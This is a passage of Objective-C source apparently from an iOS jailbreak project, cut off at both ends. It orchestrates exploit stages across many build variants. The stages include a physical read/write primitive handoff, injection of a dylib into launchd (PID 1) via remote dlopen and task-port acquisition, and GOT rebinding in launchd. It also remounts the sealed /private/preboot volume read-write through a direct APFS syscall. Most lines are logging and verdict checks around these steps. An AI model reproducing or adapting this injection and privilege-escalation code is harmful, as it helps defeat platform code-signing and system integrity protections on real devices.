            pid1_alive_102738 ? @"YES" : @"NO"] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739D_PID1_IDENTITY_UNCHANGED=%@",
            pid1_same_102738 ? @"YES" : @"NO"] UTF8String]);
#endif
        dt699_stage([[NSString stringWithFormat:@"BUILD102739C_PID1_PRESENT_AFTER_OBSERVER=%@",
            pid1_alive_102738 ? @"YES" : @"NO"] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739C_PID1_IDENTITY_UNCHANGED=%@",
            pid1_same_102738 ? @"YES" : @"NO"] UTF8String]);
#elif defined(DT_BUILD102739B_VARIANT)
        dt699_stage([[NSString stringWithFormat:@"BUILD102739B_PID1_PRESENT_AFTER_OBSERVER=%@",
            pid1_alive_102738 ? @"YES" : @"NO"] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739B_PID1_IDENTITY_UNCHANGED=%@",
            pid1_same_102738 ? @"YES" : @"NO"] UTF8String]);
#elif defined(DT_BUILD102739A_VARIANT)
        dt699_stage([[NSString stringWithFormat:@"BUILD102739A_PID1_PRESENT_AFTER_OBSERVER=%@",
            pid1_alive_102738 ? @"YES" : @"NO"] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739A_PID1_IDENTITY_UNCHANGED=%@",
            pid1_same_102738 ? @"YES" : @"NO"] UTF8String]);
#elif defined(DT_BUILD102738Z_VARIANT)
        dt699_stage([[NSString stringWithFormat:@"BUILD102738Z_PID1_PRESENT_AFTER_RETURN=%@",
            pid1_alive_102738 ? @"YES" : @"NO"] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102738Z_PID1_IDENTITY_UNCHANGED=%@",
            pid1_same_102738 ? @"YES" : @"NO"] UTF8String]);
#elif defined(DT_BUILD102738Y_VARIANT)
        dt699_stage([[NSString stringWithFormat:@"BUILD102738Y_PID1_PRESENT_AFTER_RETURN=%@",
            pid1_alive_102738 ? @"YES" : @"NO"] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102738Y_PID1_IDENTITY_UNCHANGED=%@",
            pid1_same_102738 ? @"YES" : @"NO"] UTF8String]);
#elif defined(DT_BUILD102738X_VARIANT)
        dt699_stage([[NSString stringWithFormat:@"BUILD102738X_PID1_PRESENT_AFTER_RETURN=%@",
            pid1_alive_102738 ? @"YES" : @"NO"] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102738X_PID1_IDENTITY_UNCHANGED=%@",
            pid1_same_102738 ? @"YES" : @"NO"] UTF8String]);
#elif defined(DT_BUILD102738W_VARIANT)
        dt699_stage([[NSString stringWithFormat:@"BUILD102738W_PID1_PRESENT_AFTER_RETURN=%@",
            pid1_alive_102738 ? @"YES" : @"NO"] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102738W_PID1_IDENTITY_UNCHANGED=%@",
            pid1_same_102738 ? @"YES" : @"NO"] UTF8String]);
#endif
        if (!pid1_alive_102738 || !pid1_same_102738) {
            trace_result = "LAUNCHD_SURVIVAL_FAIL";
            trace_rc = -73890;
        }
#endif

        dt102737d_emit_runtime_summary(&trace_obs, &boomerang, remote_dlopen_rc,
            restore_r_102737 == 0 ? trace_result : "WALL2_RESTORE_FAIL",
            wall2_apply_ts, remote_return_ts, wall2_restore_begin_ts,
            wall2_restore_end_ts, restore_r_102737);

        dt681_boomerang_cleanup(&boomerang);
        boomerang_started = NO;

        if (restore_r_102737 != 0)
            return dt102732c_finish(verdictOut, "WALL2_RESTORE_FAIL",
#if DT_BUILD_NUM == 102738
                -73860
#else
                -73760
#endif
            );
        if (inject_r != 0 || remote_dlopen_rc != 0)
            return dt102732c_finish(verdictOut, "REMOTE_DLOPEN_FAIL",
#if DT_BUILD_NUM == 102738
                -73870
#else
                -73770
#endif
            );
        return dt102732c_finish(verdictOut, trace_result, trace_rc);
    }
#endif

    int restore_r = dt102732c_restore_wall2(&wall2, log);
    if (wall2.launchd_proc)
        proc_rele(wall2.launchd_proc);
    wall2.launchd_proc = 0;

    if (restore_r != 0) {
        dt681_boomerang_cleanup(&boomerang);
        return dt102732c_finish(verdictOut, "WALL2_RESTORE_FAIL", -73260);
    }

    if (inject_r != 0) {
#if DT_BUILD_NUM == 102735 || DT_BUILD_NUM == 102736 || DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
        dt102735d_trace_observation_t trace_obs = {0};
        trace_obs.boomerang_wait_rc = -1;
        dt102735d_emit_runtime_summary(&trace_ctx, remote_dlopen_rc, &trace_obs,
            "REMOTE_DLOPEN_FAIL");
        dt681_boomerang_cleanup(&boomerang);
        boomerang_started = NO;
        return dt102732c_finish(verdictOut, "REMOTE_DLOPEN_FAIL",
#if DT_BUILD_NUM == 102736
            -73670
#else
            -73570
#endif
        );
#else
        dt681_boomerang_cleanup(&boomerang);
        return dt102732c_finish(verdictOut, "OPAINJECT_FAIL", -73270);
#endif
    }

#if DT_BUILD_NUM == 102735 || DT_BUILD_NUM == 102736 || DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
    if (remote_dlopen_rc != 0) {
        dt102735d_trace_observation_t trace_obs = {0};
        trace_obs.boomerang_wait_rc = -1;
        dt102735d_emit_runtime_summary(&trace_ctx, remote_dlopen_rc, &trace_obs,
            "REMOTE_DLOPEN_FAIL");
        dt681_boomerang_cleanup(&boomerang);
        boomerang_started = NO;
        return dt102732c_finish(verdictOut, "REMOTE_DLOPEN_FAIL",
#if DT_BUILD_NUM == 102736
            -73670
#else
            -73570
#endif
        );
    }

    dt102735d_trace_observation_t trace_obs = {0};
    (void)dt102735d_poll_trace_and_boomerang(&trace_ctx, &boomerang, log, &trace_obs);
    dt681_boomerang_cleanup(&boomerang);
    boomerang_started = NO;

    const char *trace_result = dt102735d_classify_result(remote_dlopen_rc, &trace_obs);
    dt102735d_emit_runtime_summary(&trace_ctx, remote_dlopen_rc, &trace_obs, trace_result);
    int trace_rc = strcmp(trace_result, "CONSTRUCTOR_BOOMERANG_ONLY_PASS") == 0 ? 0 :
#if DT_BUILD_NUM == 102736
        -73680;
#else
        -73580;
#endif
    return dt102732c_finish(verdictOut, trace_result, trace_rc);
#else
    BOOL ctor_seen = [injectCapture containsString:@"BUILD102732C_HOOK_CONSTRUCTOR_ENTERED=YES"]
        || [injectCapture containsString:@"GATE1B_LAUNCHDHOOK_CONSTRUCTOR_ENTERED"];
    BOOL symbols_pass = [injectCapture containsString:@"BUILD102732C_SYMBOL_RESOLUTION_LOOKUP=PASS"]
        && [injectCapture containsString:@"BUILD102732C_SYMBOL_RESOLUTION_REGISTER=PASS"];
    BOOL custom_pass = [injectCapture containsString:@"BUILD102732C_CUSTOM_PORT_INSTALL=PASS"];
    BOOL sysinfo_pass = [injectCapture containsString:@"BUILD102732C_SYSINFO_RECEIVED=YES"];
    BOOL pte_handoff_pass = [injectCapture containsString:@"BUILD102732C_PHYSRW_PTE_HANDOFF_RECEIVED=YES"];
    BOOL pte_init_pass = [injectCapture containsString:@"BUILD102732C_PTE_INIT_RC=0"];
    BOOL translation_pass = [injectCapture containsString:@"BUILD102732C_TRANSLATION_INIT_RC=0"];
    BOOL kcall_pass = [injectCapture containsString:@"BUILD102732C_KCALL_INIT_RESULT=PASS"]
        || [injectCapture containsString:@"BUILD102732C_KCALL_INIT_RESULT=NOT_REQUIRED"];
    BOOL boomerang_sent = [injectCapture containsString:@"BUILD102732C_BOOMERANG_DONE_SENT=YES"];
    BOOL ctor_returned = [injectCapture containsString:@"BUILD102732C_HOOK_CONSTRUCTOR_RETURNED=YES"];

    int boom_r = dt681_boomerang_wait(&boomerang, log);
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_APP_BOOMERANG_WAIT_RC=%d", boom_r] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_APP_BOOMERANG_DONE_OBSERVED=%@",
        boom_r == 0 ? @"YES" : @"NO"] UTF8String]);
    dt681_boomerang_cleanup(&boomerang);
    boomerang_started = NO;

    if (!ctor_seen)
        return dt102732c_finish(verdictOut, "CONSTRUCTOR_NOT_SEEN", -73280);
    if (!symbols_pass)
        return dt102732c_finish(verdictOut, "SYMBOL_RESOLUTION_FAIL", -73281);
    if (!custom_pass)
        return dt102732c_finish(verdictOut, "REGISTERED_PORT_FAIL", -73282);
    if (!sysinfo_pass)
        return dt102732c_finish(verdictOut, "SYSINFO_FAIL", -73283);
    if (!pte_handoff_pass)
        return dt102732c_finish(verdictOut, "PTE_HANDOFF_FAIL", -73284);
    if (!pte_init_pass)
        return dt102732c_finish(verdictOut, "PTE_INIT_FAIL", -73285);
    if (!translation_pass)
        return dt102732c_finish(verdictOut, "TRANSLATION_INIT_FAIL", -73286);
    if (!kcall_pass)
        return dt102732c_finish(verdictOut, "KCALL_INIT_FAIL", -73287);
    if (!boomerang_sent || boom_r != 0)
        return dt102732c_finish(verdictOut, "BOOMERANG_DONE_FAIL", -73288);
    if (!ctor_returned)
        return dt102732c_finish(verdictOut, "INCONCLUSIVE", -73289);

    NSTimeInterval survival_start = [[NSDate date] timeIntervalSince1970];
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_SURVIVAL_START_TS=%.3f",
        survival_start] UTF8String]);
    sleep(kDT694SyncObserveSec);
    NSTimeInterval survival_end = [[NSDate date] timeIntervalSince1970];
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_SURVIVAL_END_TS=%.3f",
        survival_end] UTF8String]);
    BOOL alive = dt698_launchd_alive();
    uint64_t pid1_after = dt102732c_pid1_proc_snapshot();
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_PID1_PRESENT_AFTER_RETURN=%@",
        alive ? @"YES" : @"NO"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_PID1_PATH=%@",
        dt102732c_pid1_path()] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_PID1_IDENTITY_UNCHANGED=%@",
        (pid1_before != 0 && pid1_before == pid1_after) ? @"YES" : @"NO"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_SURVIVAL_WINDOW_SECONDS=%u",
        (unsigned)kDT694SyncObserveSec] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_LAUNCHD_ALIVE_AFTER_31S=%@",
        alive ? @"YES" : @"NO"] UTF8String]);

    if (!alive || !pid1_before || pid1_before != pid1_after)
        rc = dt102732c_finish(verdictOut, "LAUNCHD_SURVIVAL_FAIL", -73290);
    else
        rc = dt102732c_finish(verdictOut, "CONSTRUCTOR_BOOMERANG_ONLY_PASS", 0);

    if (boomerang_started)
        dt681_boomerang_cleanup(&boomerang);
    return rc;
#endif
}

static void dt102721_emit_post_rw_failure_policy(BOOL preboot_rw_confirmed)
{
    if (!preboot_rw_confirmed)
        return;
    dt699_stage("BUILD102721_REBOOT_REQUIRED_BEFORE_NEXT_TEST");
    dt699_stage("BUILD102721_PREBOOT_MAY_REMAIN_RW=YES");
    dt699_stage("BUILD102721_PREBOOT_RO_RECOVERY_AFTER_REBOOT=NOT_PROVEN");
#ifdef DT_ROOTLESS_R4
    /* Post-KFD Bring-Up failure: do not attempt a second KFD open before reboot. */
    dt699_stage("FAILURE_AFTER_KFD_REENTRY_ALLOWED=NO");
    dt699_stage("ROOTLESS_R7_KFD_ONE_SHOT_POLICY=REBOOT_REQUIRED");
#endif
}

static void dt102721_emit_static_audit(void (^log)(NSString *line))
{
    dt1025_log(log, @"[*] PREBOOT_RW_CALLS_MAX=1");
    dt1025_log(log, @"[*] PREBOOT_RO_RESTORE_CALLS=0");
    dt1025_log(log, @"[*] DIRECT_PREBOOT_APFS_FIELD_WRITES=0");
    dt1025_log(log, @"[*] PREBOOT_BUILD47_PATCH_CALLS=0");
    dt1025_log(log, @"[*] CANONICAL_PATH_RETARGETED_TO_VAR_JB=NO");
    dt1025_log(log, @"[*] BUILD102715_ROLE_SPLIT_CHANGED=NO");
    dt1025_log(log, @"[*] BUILD102716_PHYSRW_SKIP_CHANGED=NO");
    dt1025_log(log, @"[*] WALL1_CHANGED=NO");
    dt1025_log(log, @"[*] WALL2_CHANGED=NO");
    dt1025_log(log, @"[*] KFD_CHANGED=NO");
    dt1025_log(log, @"[*] PMAP_CHANGED=NO");
    dt1025_log(log, @"[*] SIGNING_ARCHITECTURE_CHANGED=NO");
    dt1025_log(log, @"[*] TRUST_ARCHITECTURE_CHANGED=NO");
    dt699_stage("BUILD102721_NO_RO_RESTORE_ATTEMPT=YES");
}

static int dt102721_run_preboot_rw_gate(void (^log)(NSString *line), NSString **verdictOut,
    BOOL *preboot_rw_confirmed_out)
{
    static const char *kPrebootPath = "/private/preboot";

    dt102721_emit_static_audit(log);

    dt102718_graph_t baseline = {0};
    dt102718_graph_t after_rw = {0};
    uint32_t baseline_statfs_flags = 0;
    BOOL baseline_statfs_rdonly = YES;

    if (dt102718_emit_preboot_graph(log, &baseline) != 0) {
        dt699_stage("BUILD102721_PREBOOT_RW_FAIL");
        dt1025_set_verdict(verdictOut, @"BUILD102721_PREBOOT_GRAPH_FAIL");
        return -7210;
    }

    if (!dt102720_statfs_preboot(log, @"BUILD102721_PREBOOT_BASELINE", &baseline_statfs_flags,
            &baseline_statfs_rdonly)) {
        dt699_stage("BUILD102721_PREBOOT_RW_FAIL");
        dt1025_set_verdict(verdictOut, @"BUILD102721_PREBOOT_BASELINE_STATFS_FAIL");
        return -7211;
    }

    dt1025_log(log, @"[*] BUILD102721_PREBOOT_BASELINE_STATFS_FLAGS=0x%x", baseline_statfs_flags);
    dt1025_log(log, @"[*] BUILD102721_PREBOOT_BASELINE_VFS_RDONLY=%@",
        (baseline.mount_flag_70 & MNT_RDONLY) ? @"YES" : @"NO");
    dt1025_log(log, @"[*] BUILD102721_PREBOOT_BASELINE_APFS_RDONLY=%@",
        baseline.apfs_readonly_2b4 ? @"YES" : @"NO");

    BOOL baseline_ro = dt102720_preboot_fully_ro(&baseline, baseline_statfs_rdonly);
    BOOL baseline_already_rw = dt102720_preboot_observed_rw(&baseline, baseline_statfs_rdonly);
    dt699_stage([[NSString stringWithFormat:@"BUILD102721_PREBOOT_BASELINE_RO=%@",
        dt102718_yesno(baseline_ro)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102721_PREBOOT_ALREADY_RW=%@",
        dt102718_yesno(baseline_already_rw)] UTF8String]);

    BOOL rw_attempted = NO;
    int rw_rc = 0;
    int rw_errno = 0;

    if (baseline_already_rw) {
        dt699_stage("BUILD102721_PREBOOT_ALREADY_RW");
        after_rw = baseline;
    } else if (baseline_ro) {
        dt699_stage("BUILD102721_PREBOOT_RW_BEGIN");
        rw_attempted = YES;
        errno = 0;
        rw_rc = dt102720_syscall_apfs_mnt_update_rw(kPrebootPath, log);
        rw_errno = errno;
        dt1025_log(log, @"[*] BUILD102721_PREBOOT_RW_RC=%d", rw_rc);
        dt1025_log(log, @"[*] BUILD102721_PREBOOT_RW_ERRNO=%d", rw_errno);
        dt1025_log(log, @"[*] BUILD102721_PREBOOT_RW_ERRSTR=%s", rw_errno ? strerror(rw_errno) : "ok");

        if (rw_rc != 0) {
            dt699_stage("BUILD102721_PREBOOT_RW_FAIL");
            dt1025_set_verdict(verdictOut, @"BUILD102721_PREBOOT_RW_SYSCALL_FAIL");
            return -7212;
        }

        if (dt102718_emit_preboot_graph(log, &after_rw) != 0
            || !dt102720_graph_pointers_equal(&baseline, &after_rw)) {
            dt699_stage("BUILD102721_PREBOOT_RW_FAIL");
            dt1025_set_verdict(verdictOut, @"BUILD102721_PREBOOT_RW_GRAPH_IDENTITY_FAIL");
            return -7213;
        }
    } else {
        dt699_stage("BUILD102721_PREBOOT_RW_FAIL");
        dt1025_set_verdict(verdictOut, @"BUILD102721_PREBOOT_BASELINE_PARTIAL_STATE");
        return -7214;
    }

    if (baseline_already_rw) {
        if (dt102718_emit_preboot_graph(log, &after_rw) != 0) {
            dt699_stage("BUILD102721_PREBOOT_RW_FAIL");
            dt1025_set_verdict(verdictOut, @"BUILD102721_PREBOOT_ALREADY_RW_GRAPH_FAIL");
            return -7215;
        }
    }

    uint32_t rw_statfs_flags = 0;
    BOOL rw_statfs_rdonly = YES;
    if (!dt102720_statfs_preboot(log, @"BUILD102721_PREBOOT_RW_AFTER", &rw_statfs_flags, &rw_statfs_rdonly)) {
        dt699_stage("BUILD102721_PREBOOT_RW_FAIL");
        dt1025_set_verdict(verdictOut, @"BUILD102721_PREBOOT_RW_STATFS_FAIL");
        return -7216;
    }

    BOOL statfs_confirmed = !rw_statfs_rdonly;
    BOOL vfs_confirmed = (after_rw.mount_flag_70 & MNT_RDONLY) == 0;
    BOOL apfs_confirmed = after_rw.apfs_readonly_2b4 == 0;
    BOOL rw_confirmed = statfs_confirmed && vfs_confirmed && apfs_confirmed;

    dt699_stage([[NSString stringWithFormat:@"BUILD102721_PREBOOT_RW_ATTEMPTED=%@",
        dt102718_yesno(rw_attempted)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102721_PREBOOT_RW_STATFS_CONFIRMED=%@",
        dt102718_yesno(statfs_confirmed)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102721_PREBOOT_RW_VFS_CONFIRMED=%@",
        dt102718_yesno(vfs_confirmed)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102721_PREBOOT_RW_APFS_CONFIRMED=%@",
        dt102718_yesno(apfs_confirmed)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102721_PREBOOT_RW_CONFIRMED=%@",
        dt102718_yesno(rw_confirmed)] UTF8String]);

    if (!rw_confirmed) {
        dt699_stage("BUILD102721_PREBOOT_RW_FAIL");
        dt1025_set_verdict(verdictOut, @"BUILD102721_PREBOOT_RW_VERIFY_FAIL");
        return -7217;
    }

    dt699_stage("BUILD102721_PREBOOT_RW_CONFIRMED=YES");
    if (preboot_rw_confirmed_out)
        *preboot_rw_confirmed_out = YES;
    return 0;
}

int dt699_run_platform_hook_closure(void (^log)(NSString *line), NSString **verdictOut)
{
#ifdef DT_ROOTLESS_R4
    (void)log;
    dt699_stage("ROOTLESS_R10_RUN699_BLOCKED=YES");
    dt699_stage("ROOTLESS_PRODUCT_USES_SHARED_ORCH_NOT_699");
    /*
     * R24 CBR packaging identity: run699/constructor-boomerang path is intentionally
     * dead under rootless orch. Emit CBR STAGE markers here so they survive linking
     * (markers previously only lived inside dt102732c_run_constructor_boomerang_only,
     * which is DCE'd when this early return is compiled in).
     */
#if defined(DT_ROOTLESS_R24)
    dt699_stage("BUILD102738P_XPC_HOOK_PACKAGED=YES");
    dt699_stage("ROOTLESS_R24_CBR_SPAWN_HOOK_PACKAGED=YES");
    dt699_stage("ROOTLESS_R24_HOOK_DYLIB_PATH=/usr/lib/systemhook.dylib");
    dt699_stage("ROOTLESS_R24_TWEAKLOADER=OFF");
#endif
    if (verdictOut)
        *verdictOut = @"ROOTLESS_PRODUCT_USES_SHARED_ORCH_NOT_699";
    return -69910;
#endif
    BOOL preboot_rw_confirmed = NO;
    BOOL batch_trust_closure_passed = NO;

#if DT_BUILD_NUM == 102732 || DT_BUILD_NUM == 102733 || DT_BUILD_NUM == 102734 || DT_BUILD_NUM == 102735 || DT_BUILD_NUM == 102736 || DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
    dt699_stage("BUILD102732C_RUNNER_ENTRY");
#if DT_BUILD_NUM == 102735
    dt699_stage("BUILD102735D_RUNNER_ENTRY");
    dt699_stage("BUILD102735D_SCOPE=CANONICAL_PREBOOT_CONSTRUCTOR_TRACE_DIAGNOSTIC");
    dt699_stage("BUILD102732C_SCOPE=CANONICAL_PREBOOT_CONSTRUCTOR_TRACE_DIAGNOSTIC");
#elif DT_BUILD_NUM == 102737
    dt699_stage("BUILD102737D_RUNNER_ENTRY");
    dt699_stage("BUILD102737D_SCOPE=PTE_HANDOFF_AND_WALL2_LIFETIME_DIAGNOSTIC");
    dt699_stage("BUILD102732C_SCOPE=PTE_HANDOFF_AND_WALL2_LIFETIME_DIAGNOSTIC");
#elif DT_BUILD_NUM == 102738
    dt699_stage("BUILD102738P_RUNNER_ENTRY");
    dt699_stage("BUILD102738P_SCOPE=LAUNCHD_GOT_PROTECTION_ONLY");
    dt699_stage("BUILD102732C_SCOPE=LAUNCHD_GOT_PROTECTION_ONLY");
#ifdef DT_BUILD102739C_VARIANT
#ifdef DT_BUILD102739D_VARIANT
    dt699_stage("BUILD102739D_RUNNER_ENTRY");
    dt699_stage("BUILD102739D_SCOPE=DETERMINISTIC_POST_WALL2_LAUNCHD_XPC_TRIGGER");
#endif
    dt699_stage("BUILD102739C_RUNNER_ENTRY");
    dt699_stage("BUILD102739C_SCOPE=POST_WALL2_XPC_OUTPUT_CONTRACT_OBSERVATION");
#elif defined(DT_BUILD102739B_VARIANT)
    dt699_stage("BUILD102739B_RUNNER_ENTRY");
    dt699_stage("BUILD102739B_SCOPE=POST_WALL2_ORIGINAL_RETURN_PATH_OBSERVATION");
#elif defined(DT_BUILD102739A_VARIANT)
    dt699_stage("BUILD102739A_RUNNER_ENTRY");
    dt699_stage("BUILD102739A_SCOPE=POST_WALL2_READ_ONLY_WRAPPER_INVOCATION_OBSERVATION");
#elif defined(DT_BUILD102738Z_VARIANT)
    dt699_stage("BUILD102738Z_RUNNER_ENTRY");
    dt699_stage("BUILD102738Z_SCOPE=LAUNCHD_GOT_PERSISTENT_TRANSPARENT_WRAPPER_INSTALL_ONLY");
#elif defined(DT_BUILD102738Y_VARIANT)
    dt699_stage("BUILD102738Y_RUNNER_ENTRY");
    dt699_stage("BUILD102738Y_SCOPE=CONTROLLED_LAUNCHD_GOT_WRAPPER_NONBLOCKING_SINGLE_SAMPLE");
#elif defined(DT_BUILD102738X_VARIANT)
    dt699_stage("BUILD102738X_RUNNER_ENTRY");
    dt699_stage("BUILD102738X_SCOPE=LAUNCHD_GOT_TRANSPARENT_REBIND_ROUNDTRIP_ONLY");
#elif defined(DT_BUILD102738W_VARIANT)
    dt699_stage("BUILD102738W_RUNNER_ENTRY");
    dt699_stage("BUILD102738W_SCOPE=LAUNCHD_GOT_SAME_VALUE_STORE_ONLY");
#endif
#elif DT_BUILD_NUM == 102736
    dt699_stage("BUILD102736C_RUNNER_ENTRY");
    dt699_stage("BUILD102736C_SCOPE=OPAINJECT_TASK_PORT_ACQUISITION_REPAIR");
    dt699_stage("BUILD102732C_SCOPE=OPAINJECT_TASK_PORT_ACQUISITION_REPAIR");
#elif DT_BUILD_NUM == 102734
    dt699_stage("BUILD102734C_RUNNER_ENTRY");
    dt699_stage("BUILD102734C_SCOPE=CONSTRUCTOR_BOOMERANG_ONLY_OPAINJECT_TASKPORT_REPAIR");
    dt699_stage("BUILD102732C_SCOPE=CONSTRUCTOR_BOOMERANG_ONLY_OPAINJECT_TASKPORT_REPAIR");
#elif DT_BUILD_NUM == 102733
    dt699_stage("BUILD102732C_SCOPE=CONSTRUCTOR_BOOMERANG_ONLY_VALIDATOR_FIX");
#else
    dt699_stage("BUILD102732C_SCOPE=CONSTRUCTOR_BOOMERANG_ONLY");
#endif
    dt699_stage("KCALL699_PLATFORM_HOOK_CLOSURE_BEGIN");
#else
    dt699_stage("BUILD102722_BEGIN");
    dt699_stage("BUILD102723_BEGIN");
    dt699_stage("BUILD102724_BEGIN");
    dt102723_emit_static_audit(log);
    dt102724_emit_static_audit(log);
    dt699_stage("BUILD102722_SCOPE=BATCHED_TRUSTCACHE_CLOSURE_ONLY");
    dt699_stage("FULL_ROLLBACK_REDESIGN=NO");
    dt699_stage("POST_RW_FAILURE_POLICY=YES");
    dt699_stage("PARTIAL_TREE_CLEANUP=NOT_IMPLEMENTED");
    dt699_stage("KCALL699_PLATFORM_HOOK_CLOSURE_BEGIN");
    dt699_stage("BUILD102707_PHASEB_HOOK_PRESERVE");
    dt699_stage("BUILD102709_RESTORE_TRUTH_MODEL_FIX");
    dt699_stage("BUILD102706_RUNTIME_IDENTITY_CHAIN_FIX");
    dt699_stage("BUILD102704_RUNTIME_CHOMA_LAYOUT_FIX");
    dt699_stage("BUILD102710_CANONICAL_PREBOOT_FIRST_LOAD");
    dt699_stage("RUNTIME_CHOMA_SIGNER_FORM=IN_PROCESS_MAIN_APP");
    dt699_stage("BUILD102699_SCOPE=NATIVE_PLATFORM_SIGNING_AND_LAUNCHD_CORRELATION");
    dt699_stage("ZONE8_MUTATION_IMPLEMENTED=NO");
    dt699_stage("B1_TEXT_PATCH_IMPLEMENTED=NO");
    dt699_stage("B4_PROC_IMPLEMENTED=NO");
#endif

    dt699_stage("BUILD102720_PHYSRW_STATE_CHECK");
    dt1025_log(log, @"[*] PHYSRW_READY_PREDICATE=DTPhys716PhysReady");
    dt1025_log(log, @"[*] PHYSRW_READY_PREDICATE_CALLABLE_FROM_102720=YES");
    if (!dt_phys716_phys_ready()) {
        dt699_stage("BUILD102720_PHYSRW_NOT_PRIMED");
        dt1025_log(log, @"[*] BUILD102720_PHYSRW_NOT_PRIMED");
        dt1025_set_verdict(verdictOut, @"BUILD102720_PHYSRW_NOT_PRIMED");
        dt699_stage("PHASE_A_PLATFORM_BLOB=NOT_RUN");
        dt699_stage("PHASE_B_LAUNCHD_TEST=NOT_RUN");
        return -7201;
    }

    if (dt_build_physrw_handoff_only(log) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL699_PHYSRW_FAIL");
        dt699_stage("PHASE_A_PLATFORM_BLOB=FAIL");
        dt699_stage("PHASE_B_LAUNCHD_TEST=NOT_RUN");
        return -1;
    }
    dt699_stage("BUILD102720_PHYSRW_READY_CONFIRMED");

#if DT_BUILD_NUM == 102729
    dt699_stage("BUILD102729A_INSERTION_AFTER_PHYSRW_HANDOFF");
    dt699_stage("PHASE_B_LAUNCHD_TEST=NOT_RUN");
    dt699_stage("BUILD102724_PHASE_B_REACHABLE=NO");
    NSString *probe729Verdict = nil;
    int pr729 = dt_build729a_run_self_page_protection_control(log, &probe729Verdict);
    if (pr729 == 0) {
        if (verdictOut)
            *verdictOut = probe729Verdict ?: @"SELF_PAGE_PROTECTION_CONTROL_PASS";
        return 0;
    }
    if (verdictOut)
        *verdictOut = probe729Verdict ?: @"BUILD102729A_INCONCLUSIVE";
    return pr729;
#elif DT_BUILD_NUM == 102725 || DT_BUILD_NUM == 102728
    dt699_stage("BUILD102725R_INSERTION_AFTER_PHYSRW_HANDOFF");
    dt699_stage("PHASE_B_LAUNCHD_TEST=NOT_RUN");
    dt699_stage("BUILD102724_PHASE_B_REACHABLE=NO");
    NSString *probe725Verdict = nil;
    int pr725 = dt_build725r_run_readonly_launchd_probe(log, &probe725Verdict);
    if (pr725 == 0) {
        if (verdictOut)
            *verdictOut = probe725Verdict ?: @"BUILD102725R_PASS";
        return 0;
    }
    if (verdictOut)
        *verdictOut = probe725Verdict ?: @"BUILD102725R_FAIL";
    return pr725;
#elif DT_BUILD_NUM == 102726
    dt699_stage("BUILD102726D_INSERTION_AFTER_PHYSRW_HANDOFF");
    dt699_stage("PHASE_B_LAUNCHD_TEST=NOT_RUN");
    dt699_stage("BUILD102724_PHASE_B_REACHABLE=NO");
    NSString *diag726Verdict = nil;
    int pr726 = dt_build726d_run_readonly_launchd_read_diag(log, &diag726Verdict);
    if (verdictOut)
        *verdictOut = diag726Verdict ?: @"BUILD102726D_INCONCLUSIVE";
    return pr726;
#elif DT_BUILD_NUM == 102727
    dt699_stage("BUILD102727R_INSERTION_AFTER_PHYSRW_HANDOFF");
    dt699_stage("PHASE_B_LAUNCHD_TEST=NOT_RUN");
    dt699_stage("BUILD102724_PHASE_B_REACHABLE=NO");
    NSString *tel727Verdict = nil;
    int pr727 = dt_build727r_run_readonly_launchd_contract_telemetry(log, &tel727Verdict);
    if (verdictOut)
        *verdictOut = tel727Verdict ?: @"BUILD102727R_INCONCLUSIVE";
    return pr727;
#elif DT_BUILD_NUM == 102732 || DT_BUILD_NUM == 102733 || DT_BUILD_NUM == 102734 || DT_BUILD_NUM == 102735 || DT_BUILD_NUM == 102736 || DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
    dt699_stage("BUILD102732C_INSERTION_AFTER_PHYSRW_HANDOFF");
#if DT_BUILD_NUM == 102735
    dt699_stage("BUILD102735D_INSERTION_AFTER_PHYSRW_HANDOFF");
#elif DT_BUILD_NUM == 102737
    dt699_stage("BUILD102737D_INSERTION_AFTER_PHYSRW_HANDOFF");
#elif DT_BUILD_NUM == 102738
    dt699_stage("BUILD102738P_INSERTION_AFTER_PHYSRW_HANDOFF");
#ifdef DT_BUILD102739C_VARIANT
#ifdef DT_BUILD102739D_VARIANT
    dt699_stage("BUILD102739D_INSERTION_AFTER_PHYSRW_HANDOFF");
    dt699_stage("BUILD102739D_SCOPE=DETERMINISTIC_POST_WALL2_LAUNCHD_XPC_TRIGGER");
#endif
    dt699_stage("BUILD102739C_INSERTION_AFTER_PHYSRW_HANDOFF");
    dt699_stage("BUILD102739C_SCOPE=POST_WALL2_XPC_OUTPUT_CONTRACT_OBSERVATION");
#elif defined(DT_BUILD102739B_VARIANT)
    dt699_stage("BUILD102739B_INSERTION_AFTER_PHYSRW_HANDOFF");
    dt699_stage("BUILD102739B_SCOPE=POST_WALL2_ORIGINAL_RETURN_PATH_OBSERVATION");
#elif defined(DT_BUILD102739A_VARIANT)
    dt699_stage("BUILD102739A_INSERTION_AFTER_PHYSRW_HANDOFF");
    dt699_stage("BUILD102739A_SCOPE=POST_WALL2_READ_ONLY_WRAPPER_INVOCATION_OBSERVATION");
#elif defined(DT_BUILD102738Z_VARIANT)
    dt699_stage("BUILD102738Z_INSERTION_AFTER_PHYSRW_HANDOFF");
#elif defined(DT_BUILD102738Y_VARIANT)
